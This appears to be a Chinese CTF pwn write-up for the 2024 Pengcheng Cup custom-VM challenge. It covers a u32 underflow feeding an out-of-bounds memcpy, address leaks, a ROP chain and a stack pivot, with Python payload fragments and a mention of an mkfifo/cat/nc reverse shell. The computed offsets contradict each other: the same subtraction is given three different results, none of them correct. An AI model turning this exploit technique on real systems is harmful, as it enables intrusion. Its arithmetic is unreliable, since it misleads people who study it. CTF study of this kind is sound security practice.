---
title: web选手入门pwn(30) 鹏城杯VM 自定义指令集栈迁移
contest: 鹏城杯
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [custom-vm, link_s-underflow, u32-overflow, memcpy-OOB, ret2libc, stack-pivot]
attack_chain: 解析 6 条自定义 VM 指令(mov_r/add_r/store_r/load_r_s/link_s/copy_s) → set_s(1,0x200)+set_s(3,u32_wrap-0x108)=0xFFFFFFE8 → link_s(1,3) 让 s1.idx_b 变成 s3.idx_b - 0x108=0xFFFFFFE0 → copy_s(1,0x100) 触发 memcpy(vm_mem+0x200, vm_mem+0xFFFFFFE0, 0x100) 把栈拷到 vm_mem+0x200 / 但 0x200 是 vm_mem 内偏移，因此实际是 vm_mem 内 0x200 处被填充为栈内容 / 多次 add_r+store_r 写 ROP 链
key_payload: set_s(3, 0x100000000 - 0x108)  # u32 下溢让 idx_b = 0xFFFFFFE8  link_s(1,3)  copy_s(1, fake_stack=0x2000)
one_liner: 鹏城杯 VM 逆向 + 整数下溢 set_s 触发 link_s+copy_s 越界 memcpy 实现栈迁移打 ROP。
lesson: 自定义 VM 题逆向重点在寄存器/段寄存器字段长度；u32 wrap 减法是绕过长度检查的标准手段；copy_s(1, offset) 中 offset 是 vm_mem 内偏移，但 src (link_s 后的 idx_b) 是用户控制的任意 32 位值，组合触发任意地址 memcpy。
quality: high
---

# web选手入门pwn(30) 鹏城杯 VM (自定义指令集)

## 自定义 VM 指令集
| opcode | 助记符 | 含义 |
|--------|--------|------|
| 0x01 | mov_r | `MOV r[byte0], imm(4B)` |
| 0x02 | add_r | `r[byte0] = r[byte0] + r[byte1]` |
| 0x0B | load_r | `r[byte0] = *(u32*)(vm_mem + imm32)` |
| 0x0C | store_r | `*(u32*)(vm_mem + imm32) = r[byte0]` |
| 0x20 | set_s | `s[byte0].idx_a = imm32; s[byte0].idx_b = imm32` |
| 0x21 | load_r_s | `r[byte0] = *(u32*)(vm_mem + s[byte0].idx_b)` |
| 0x22 | link_s | `s[byte0] = s[byte1]` (结构体拷贝，包括 idx_a 和 idx_b) |
| 0x23 | copy_s | `if (x01) memcpy(vm_mem + s[0].idx_a, vm_mem + s[byte1].idx_b, 0x100)` |

## 关键漏洞
- `set_s` 的 idx_a/idx_b 是 u32 类型，**但用 0x100000000 - 0x108 写入会下溢为 0xFFFFFE00 类地址**
- `link_s` 让 s1 变成 s3 的副本（idx_a/idx_b 都跟 s3）
- `copy_s` 用 s[0].idx_a (0x200) 作为 dst, s[1].idx_b 作为 src
- 如果 s[1].idx_b = 0xFFFFFE00，则 `memcpy(vm_mem+0x200, vm_mem+0xFFFFFE00, 0x100)` 跨越 vm_mem/栈边界，把栈内容拷到 vm_mem+0x200

## 利用步骤

### Stage 1: 泄地址
```python
# vm_mem = 0x7ffffffec960
# 栈上残留值：0x7fffffffe2e8 (libc addr) 0x7fffffffe2b0 (stack addr)
# 把 libc/stack 地址从栈拷到 vm_mem 内
payload += set_s(0, 0x7fffffffe2e8 - 0x7ffffffec960)
payload += load_r_s(0, 0)
payload += set_s(1, 0x7fffffffe2e8 - 0x7ffffffec960 + 0x4)
payload += load_r_s(1, 1)
# 同理 r2/r3 取 stack addr
```

### Stage 2: 构造 ROP 写到 fake_stack=0x2000
- `mov_r(7, p32(ret - 0x8b6d5))` + `add_r(0, 7)` 累加得到 ret 偏移
- `store_r(0, fake_stack + 0x4*i)` 写 ROP 第 i 个 qword

### Stage 3: 把 fake_stack 内容再拷到真实栈
```python
# 但这次 src 不能是栈（栈地址变了），所以：
# 用 s3 = u32_wrap - 0x108 让 idx_b = 0xFFFFFE00
payload += set_s(1, 0x200)
payload += set_s(3, u32_wrap - 0x108)  # idx_b = 0xFFFFFE00
payload += link_s(1, 3)
payload += copy_s(1, fake_stack)
```

## 经验提炼
- 自定义 VM 逆向第一步：识别所有 opcode 的字节编码 + 助记符映射
- 段寄存器（s）的 idx_b 在 link_s 之后可任意改值，配合 copy_s 形成"任意地址 memcpy"原语
- u32 减法下溢（`u32_wrap - small`）是绕过长度检查的标准手法
- 栈迁移到 vm_mem 后，ROP 链直接写在 vm_mem 内（由 store_r 完成），比传统栈布局更隐蔽
- 反弹 shell 用 `mkfifo + cat + nc` 经典三件套
